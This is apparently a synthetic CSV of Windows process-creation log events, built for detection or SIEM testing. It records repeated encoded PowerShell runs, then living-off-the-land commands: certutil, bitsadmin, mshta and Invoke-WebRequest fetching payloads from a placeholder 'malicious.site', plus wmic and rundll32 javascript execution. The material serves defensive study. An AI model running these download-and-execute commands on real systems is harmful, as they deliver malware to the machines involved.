_time,host,EventCode,user,src_ip,process,command_line,status,description
2025-09-10T12:00:25,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:00:30,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:00:35,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:00:40,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:00:45,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:00:50,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:00:55,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:00,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:05,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:10,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:15,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:20,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:25,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:30,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:35,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:40,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:45,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:50,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:01:55,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:00,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:05,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:10,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:15,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:20,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:25,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:30,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:35,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:40,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:45,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:50,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:02:55,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:00,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:05,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:10,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:15,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:20,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:25,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:30,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:35,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:40,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:45,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:50,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:03:55,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:00,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:05,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:10,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:15,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:20,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:25,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:30,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:35,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:40,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:45,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:50,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:04:55,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:00,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:05,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:10,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:15,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:20,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:25,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:30,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:35,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:40,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:45,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:50,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:05:55,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:00,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:05,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:10,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:15,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:20,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:25,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:30,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:35,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:40,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:45,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:50,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:06:55,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:00,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:05,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:10,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:15,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:20,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:25,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:30,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:35,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:40,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:45,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:50,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:07:55,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:00,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:05,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:10,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:15,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:20,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:25,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:30,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:35,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:40,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:45,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:50,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:08:55,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:00,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:05,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:10,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:15,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:20,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:25,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:30,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:35,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:40,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:45,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:50,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:09:55,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:00,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:05,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:10,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:15,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:20,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:25,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:30,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:35,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:40,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:45,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:50,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:10:55,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:11:00,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:11:05,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:11:10,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:11:15,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:11:20,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:11:25,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:11:30,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:11:35,WIN-WS01,4688,alice,10.0.0.12,powershell.exe,powershell -enc SQBFAFgA,OK,malicious_powershell_payload
2025-09-10T12:11:40,WIN-DB01,4688,alice,10.0.0.44,rundll32.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:11:45,WIN-APP01,4688,alice,10.0.0.12,mshta.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:11:50,WIN-APP01,4688,alice,10.0.0.8,certutil.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:11:55,WIN-WS01,4688,alice,10.0.0.44,cmd.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:12:00,WIN-DC01,4688,alice,10.0.0.8,certutil.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:12:05,WIN-DB01,4688,alice,10.0.0.44,powershell.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:12:10,WIN-DB01,4688,alice,10.0.0.5,powershell.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:12:15,WIN-DC01,4688,alice,10.0.0.5,rundll32.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:12:20,WIN-DB01,4688,alice,10.0.0.12,powershell.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:12:25,WIN-WS01,4688,alice,10.0.0.44,certutil.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:12:30,WIN-DC01,4688,alice,10.0.0.44,wmic.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:12:35,WIN-APP01,4688,alice,10.0.0.12,cmd.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:12:40,WIN-WS02,4688,alice,10.0.0.44,rundll32.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:12:45,WIN-DB01,4688,alice,10.0.0.8,cmd.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:12:50,WIN-WS02,4688,alice,10.0.0.5,powershell.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:12:55,WIN-DC01,4688,alice,10.0.0.44,cmd.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:13:00,WIN-WS02,4688,alice,10.0.0.44,rundll32.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:13:05,WIN-DC01,4688,alice,10.0.0.44,rundll32.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:13:10,WIN-DC01,4688,alice,10.0.0.44,wmic.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:13:15,WIN-WS02,4688,alice,10.0.0.8,cmd.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:13:20,WIN-APP01,4688,alice,10.0.0.44,cmd.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:13:25,WIN-WS02,4688,alice,10.0.0.5,bitsadmin.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:13:30,WIN-DB01,4688,alice,10.0.0.5,powershell.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:13:35,WIN-DC01,4688,alice,10.0.0.5,bitsadmin.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:13:40,WIN-DC01,4688,alice,10.0.0.12,wmic.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:13:45,WIN-WS01,4688,alice,10.0.0.8,bitsadmin.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:13:50,WIN-APP01,4688,alice,10.0.0.12,bitsadmin.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:13:55,WIN-DC01,4688,alice,10.0.0.5,powershell.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:14:00,WIN-DB01,4688,alice,10.0.0.5,wmic.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:14:05,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:14:10,WIN-APP01,4688,alice,10.0.0.5,powershell.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:14:15,WIN-WS01,4688,alice,10.0.0.5,mshta.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:14:20,WIN-APP01,4688,alice,10.0.0.8,powershell.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:14:25,WIN-WS01,4688,alice,10.0.0.5,wmic.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:14:30,WIN-DB01,4688,alice,10.0.0.5,mshta.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:14:35,WIN-WS01,4688,alice,10.0.0.12,cmd.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:14:40,WIN-WS02,4688,alice,10.0.0.44,rundll32.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:14:45,WIN-APP01,4688,alice,10.0.0.8,mshta.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:14:50,WIN-WS01,4688,alice,10.0.0.44,powershell.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:14:55,WIN-WS01,4688,alice,10.0.0.8,rundll32.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:15:00,WIN-DB01,4688,alice,10.0.0.5,powershell.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:15:05,WIN-APP01,4688,alice,10.0.0.44,wmic.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:15:10,WIN-WS02,4688,alice,10.0.0.8,rundll32.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:15:15,WIN-APP01,4688,alice,10.0.0.12,cmd.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:15:20,WIN-WS02,4688,alice,10.0.0.44,certutil.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:15:25,WIN-DC01,4688,alice,10.0.0.5,bitsadmin.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:15:30,WIN-APP01,4688,alice,10.0.0.5,cmd.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:15:35,WIN-DB01,4688,alice,10.0.0.12,certutil.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:15:40,WIN-WS01,4688,alice,10.0.0.8,bitsadmin.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:15:45,WIN-DB01,4688,alice,10.0.0.5,powershell.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:15:50,WIN-DB01,4688,alice,10.0.0.44,powershell.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:15:55,WIN-DC01,4688,alice,10.0.0.12,rundll32.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:16:00,WIN-DC01,4688,alice,10.0.0.12,rundll32.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:16:05,WIN-DB01,4688,alice,10.0.0.8,powershell.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:16:10,WIN-WS01,4688,alice,10.0.0.8,mshta.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:16:15,WIN-DC01,4688,alice,10.0.0.44,bitsadmin.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:16:20,WIN-WS02,4688,alice,10.0.0.8,wmic.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
